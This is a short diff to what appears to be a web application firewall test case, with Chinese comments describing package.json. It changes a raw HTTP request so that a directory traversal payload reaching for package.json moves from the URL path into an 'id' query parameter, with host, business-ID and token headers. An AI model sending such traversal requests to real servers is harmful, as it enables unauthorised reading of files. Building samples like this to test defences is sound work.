@@ -1,6 +1,6 @@
 # 目录遍历_package.json
 # package.json 是一个用于描述 Node.js 项目的 JSON 文件。它通常位于项目的根目录下，包含了项目的元数据、依赖项、脚本、项目所依赖的包、指定了项目可以使用/正在使用的包的版本等信息。
-GET /../../../../../../../../../../../../package.json?acid=80050826&bid=hd_tag_m8mv24l1 HTTP/1.1
+GET /?id=../../../../../../../../../../../../package.json&acid=80050826&bid=hd_tag_m8mv24l1 HTTP/1.1
 Host: www.swaf.com
 RM-PRO-BusinessID: hd_tag_m8mv24l1
 RM-PRO-Token: 6b7aa9b5fdcd8ef364b317a913866b99
